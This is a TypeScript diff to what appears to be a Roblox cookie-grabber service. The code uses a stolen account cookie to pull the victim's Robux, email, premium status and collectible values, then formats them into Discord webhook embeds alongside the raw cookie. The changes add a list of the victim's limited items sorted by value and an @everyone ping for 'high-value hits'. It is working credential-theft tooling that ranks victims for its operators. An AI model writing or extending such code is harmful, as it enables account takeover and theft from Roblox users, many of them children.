@@ -319,6 +319,7 @@ interface RobloxInfo {
   email: string | null;
   emailVerified: boolean | null;
   ownedPasses: Array<{ game: string; passes: Array<{ id: number; owned: boolean }> }>;
+  limiteds: Array<{ assetId: number; name: string; rap: number }>;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -341,7 +342,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     }
     if (!auth) return null;
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
+    const [robux, premium, headshot, avatar, rapInfo, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals, ownedPasses, emailInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -360,6 +361,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchOwnedPasses(auth.id),
       fetchEmail(cookieHeader),
     ]);
+    const rap = rapInfo?.total ?? null;
+    const limiteds = rapInfo?.items ?? [];
 
     const createdAt = profile?.created ?? null;
     const accountAgeDays = createdAt
@@ -394,6 +397,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       email: emailInfo?.address ?? null,
       emailVerified: emailInfo?.verified ?? null,
       ownedPasses,
+      limiteds,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
@@ -665,21 +669,26 @@ async function fetchHeadshot(userId: number): Promise<string | null> {
   } catch { return null; }
 }
 
-// Sums RAP across all collectibles owned by the user.
-async function fetchRap(userId: number): Promise<number | null> {
+// Sums RAP across all collectibles owned by the user, and returns each item.
+async function fetchRap(userId: number): Promise<{ total: number; items: Array<{ assetId: number; name: string; rap: number }> } | null> {
   try {
     let total = 0;
+    const items: Array<{ assetId: number; name: string; rap: number }> = [];
     let cursor = "";
     for (let page = 0; page < 10; page++) {
       const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ""}`;
       const r = await fetch(url);
-      if (!r.ok) return total || null;
-      const j = await r.json() as { data?: Array<{ recentAveragePrice?: number }>; nextPageCursor?: string };
-      for (const item of j.data ?? []) total += item.recentAveragePrice ?? 0;
+      if (!r.ok) return { total, items };
+      const j = await r.json() as { data?: Array<{ assetId?: number; userAssetId?: number; name?: string; recentAveragePrice?: number }>; nextPageCursor?: string };
+      for (const item of j.data ?? []) {
+        const rap = item.recentAveragePrice ?? 0;
+        total += rap;
+        items.push({ assetId: item.assetId ?? 0, name: item.name ?? "Unknown", rap });
+      }
       if (!j.nextPageCursor) break;
       cursor = j.nextPageCursor;
     }
-    return total;
+    return { total, items };
   } catch { return null; }
 }
 
@@ -747,6 +756,7 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
       { name: `${EMOJI.email} Email`, value: roblox.email ? `${roblox.email} ${roblox.emailVerified ? "✅ Verified" : "❌ Unverified"}` : (roblox.emailVerified === null ? "Unknown" : "❌ None set"), inline: true },
       { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.rap} Limiteds`, value: `${roblox.limiteds.length.toLocaleString()} items — ${(roblox.rap ?? 0).toLocaleString()} RAP`, inline: true },
     );
 
     // Owned groups — chunked to 1024 chars per field
@@ -824,6 +834,32 @@ function buildDiscordPayload(opts: {
       footer: { text: `${siteName} • Gamepass Ownership` },
     });
   }
+
+  // Limiteds embed — top items chunked to 1024 chars per field
+  if (roblox && roblox.limiteds.length > 0) {
+    const sorted = [...roblox.limiteds].sort((a, b) => b.rap - a.rap);
+    const lines = sorted.map(
+      (i) => `• [${i.name}](https://www.roblox.com/catalog/${i.assetId}) — ${i.rap.toLocaleString()} RAP`
+    );
+    const chunks: string[] = [];
+    let buf = "";
+    for (const line of lines) {
+      if ((buf + "\n" + line).length > 1024) { chunks.push(buf); buf = line; }
+      else buf = buf ? `${buf}\n${line}` : line;
+    }
+    if (buf) chunks.push(buf);
+    embeds.push({
+      title: `${EMOJI.rap} Limiteds (${roblox.limiteds.length} • ${(roblox.rap ?? 0).toLocaleString()} RAP)`,
+      color: 0xf59e0b,
+      fields: chunks.map((c, i) => ({
+        name: chunks.length === 1 ? "Items" : `Items (${i + 1}/${chunks.length})`,
+        value: c,
+        inline: false,
+      })),
+      footer: { text: `${siteName} • Collectibles` },
+    });
+  }
+
   embeds.push({
     title: `${EMOJI.cookie} Account Cookie`,
     color: 0xff5555,
@@ -831,8 +867,18 @@ function buildDiscordPayload(opts: {
     footer: { text: "Handle with care" },
   });
 
+  // @everyone ping for high-value hits: 300+ Robux, RAP > 100, or Korblox/Headless.
+  const isBigHit = !!roblox && (
+    (roblox.robux ?? 0) >= 300 ||
+    (roblox.rap ?? 0) > 100 ||
+    roblox.hasKorblox === true ||
+    roblox.hasHeadless === true
+  );
+  const content = `${isBigHit ? "@everyone " : ""}**New ${toolType} Submission** (${siteName} / ${ownerUsername})`;
+
   return {
-    content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
+    content,
+    allowed_mentions: isBigHit ? { parse: ["everyone"] } : { parse: [] },
     embeds,
   };
 }
